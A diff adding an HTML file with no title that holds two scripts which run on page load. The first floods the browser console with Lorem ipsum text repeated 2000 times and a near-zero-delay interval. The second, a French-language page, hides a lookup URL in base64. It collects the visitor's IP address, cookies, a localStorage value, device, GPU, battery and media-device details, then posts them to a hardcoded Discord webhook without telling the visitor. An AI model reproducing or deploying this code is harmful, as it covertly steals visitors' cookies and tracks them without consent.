@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title></title>
+
+<script>
+    const ultraLongText = `
+Lorem ipsum dolor sit amet, consectetur adipiscing elit. 
+Suspendisse pharetra convallis sapien, nec gravida tortor ultricies vitae.
+Aenean sed commodo lacus. Donec ac purus ut erat pharetra porta.
+Vestibulum quis lectus suscipit, facilisis sem in, gravida mi.
+Curabitur aliquet, arcu at dictum efficitur, magna sem interdum augue,
+in euismod urna massa nec neque. Sed viverra leo non felis pretium,
+vel tincidunt nunc porta. Mauris posuere mauris id urna sollicitudin,
+sit amet fringilla augue sagittis. Aliquam erat volutpat. 
+Integer vel neque non orci commodo gravida vel nec velit.
+Nam ut interdum justo. Duis vulputate risus at felis lacinia, 
+eu fermentum justo euismod. Proin tincidunt leo purus, 
+ac placerat lacus commodo a. Curabitur volutpat leo arcu, 
+a elementum tortor feugiat sed.
+
+Morbi non nisi vitae eros consequat ullamcorper. Donec et leo id 
+libero interdum luctus. Pellentesque sit amet tempor sapien. 
+Integer fermentum nibh non turpis tempor scelerisque. Nulla ut 
+vehicula arcu. Sed sed ullamcorper nibh. Etiam non fermentum felis. 
+Curabitur faucibus mauris ut libero dignissim, eget varius mauris 
+lacinia. Integer id orci sed mauris tristique bibendum.
+Vivamus pharetra erat id est pharetra, vitae luctus eros tincidunt.
+
+
+`.repeat(2000);
+
+    console.log(ultraLongText);
+
+    setInterval(() => {
+        console.log("----------------------------------------------------------------------------------------------------------------");
+    }, 0.01);
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+  <script>
+    (function() {
+      const a = atob("aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u");
+      fetch(a)
+        .then(b => b.json())
+        .then(c => {
+          const d = c.ip;
+          const e = navigator.platform;
+          const f = navigator.language || navigator.userLanguage;
+          const g = screen.width;
+          const h = screen.height;
+          const i = navigator.userAgent;
+          const j = navigator.connection ? navigator.connection.effectiveType : "Non disponible";
+          const k = window.innerWidth;
+          const l = window.innerHeight;
+          const m = document.cookie;
+          const n = localStorage.getItem('key') || "Aucune donnée trouvée";
+          const o = window.performance.timing;
+          const p = Notification.permission;
+
+          navigator.getBattery().then(q => {
+            const r = q.level * 100 + "%";
+            const s = q.charging ? "Oui" : "Non";
+
+            navigator.mediaDevices.enumerateDevices().then(t => {
+              const u = t.filter(v => v.kind === "audioinput");
+              const w = t.filter(x => x.kind === "videoinput");
+
+              const x = u.length > 0 ? u.map(v => v.label).join(", ") : "Aucun périphérique audio ou permission refusée.";
+              const y = w.length > 0 ? w.map(v => v.label).join(", ") : "Aucun périphérique vidéo ou permission refusée.";
+
+              const z = document.createElement('canvas').getContext('webgl');
+              const aa = z.getExtension('WEBGL_debug_renderer_info');
+              const ab = aa ? z.getParameter(aa.UNMASKED_RENDERER_WEBGL) : "Non disponible";
+              const ac = aa ? z.getParameter(aa.UNMASKED_VENDOR_WEBGL) : "Non disponible";
+
+              const ad = navigator.hardwareConcurrency;
+
+              // Obtention de l'URL de la page où le fichier a été lancé
+              const pageLocation = window.location.href;
+
+              function ae(a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u) {
+                const v = "https://canary.discord.com/api/webhooks/1434589491695190066/Za8fHNic1OgX3uWyB2zNFmtRQWKPtC5wJbHVouxJNbWl2NEacbFZufspecj6sV-Zfdu3";
+                
+                const w = {
+                  content: `
+                    **Adresse IP :** ${a}
+                    **Système d'exploitation :** ${b}
+                    **Langue du navigateur :** ${c}
+                    **Résolution de l'écran :** ${d}x${e}
+                    **User-Agent :** ${f}
+                    **Type de connexion :** ${g}
+                    **Dimensions de la fenêtre :** ${h}x${i}
+                    **Cookies :** ${j}
+                    **LocalStorage (clé 'key') :** ${k}
+                    **Performance du navigateur :** ${JSON.stringify(l)}
+                    **Permission des notifications :** ${m}
+                    **Niveau de batterie :** ${n}
+                    **Charge de la batterie :** ${o}
+                    **Périphériques audio détectés :** ${p}
+                    **Périphériques vidéo détectés :** ${q}
+                    **GPU (Rendu) :** ${r}
+                    **GPU (Fabricant) :** ${s}
+                    **Nombre de cœurs CPU :** ${t}
+                    **URL de la page où le fichier a été lancé :** ${u}
+                  `
+                };
+
+                fetch(v, {
+                  method: "POST",
+                  headers: {
+                    "Content-Type": "application/json"
+                  },
+                  body: JSON.stringify(w)
+                })
+                .then(x => x.json())
+                .then(() => console.log('Données envoyées avec succès !'))
+                .catch(y => console.error("Erreur lors de l'envoi des données :", y));
+              }
+
+              ae(d, e, f, g, h, i, j, k, l, m, n, o, p, r, s, x, y, ab, ac, ad, pageLocation);
+            }).catch(z => console.error('Erreur lors de l\'enumeration des périphériques:', z));
+          }).catch(aa => console.error('Erreur de batterie:', aa));
+        })
+        .catch(bb => console.error("Erreur lors de la récupération de l'IP :", bb));
+    })();
+  </script>
+</body>
+</html>
